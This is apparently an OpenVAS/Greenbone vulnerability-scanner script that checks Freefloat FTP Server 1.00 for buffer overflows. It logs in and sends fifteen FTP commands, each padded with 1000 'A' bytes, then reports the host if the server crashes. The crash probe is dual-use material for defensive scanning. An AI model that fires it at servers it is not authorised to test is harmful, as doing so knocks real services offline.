if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900292" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-07-27 09:16:39 +0200 (Wed, 27 Jul 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Freefloat FTP Server POST Auth Multiple Commands Buffer Overflow Vulnerabilities" );
	script_xref( name: "URL", value: "http://secpod.org/blog/?p=310" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17550" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103166" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103162" );
	script_xref( name: "URL", value: "http://secpod.org/SECPOD_FreeFloat_FTP_Server_BoF_PoC.py" );
	script_xref( name: "URL", value: "http://secpod.org/advisories/SECPOD_FreeFloat_FTP_Server_BoF.txt" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/freefloat/detected" );
	script_tag( name: "impact", value: "Successful exploits may allow remote attackers to execute arbitrary
  code on the system or cause the application to crash." );
	script_tag( name: "affected", value: "FreeFloat Ftp Server Version 1.00, Other versions
  may also be affected." );
	script_tag( name: "insight", value: "The flaw is due to improper bounds checking when processing
  'ACCL', 'AUTH', 'APPE', 'ALLO', 'ACCT' multiple commands with specially-crafted
  an overly long parameter." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Freefloat FTP Server and is prone to
  multiple buffer overflow vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "220 FreeFloat" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
banner = ftp_recv_line( socket: soc );
ftp_close( socket: soc );
if(!banner || !ContainsString( banner, "220 FreeFloat" )){
	exit( 0 );
}
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	exit( 0 );
}
ftplogin = ftp_log_in( socket: soc1, user: "test", pass: "test" );
if(!ftplogin){
	exit( 0 );
}
vuln_cmds = make_list( "ACCL",
	 "AUTH",
	 "APPE",
	 "ALLO",
	 "ACCT",
	 "DELE",
	 "MDTM",
	 "RETR",
	 "RMD",
	 "STAT",
	 "SIZE",
	 "STOR",
	 "RNTO",
	 "RNFR",
	 "STOU" );
for cmd in vuln_cmds {
	send( socket: soc1, data: NASLString( cmd, " ", crap( length: 1000, data: "A" ), "\r\n" ) );
	sleep( 1 );
	soc2 = open_sock_tcp( ftpPort );
	if(!soc2){
		security_message( port: ftpPort );
		exit( 0 );
	}
	banner = recv( socket: soc2, length: 512 );
	if(!banner || !ContainsString( banner, "220 FreeFloat" )){
		close( soc2 );
		security_message( port: ftpPort );
		exit( 0 );
	}
	ftp_close( socket: soc2 );
}
ftp_close( socket: soc1 );

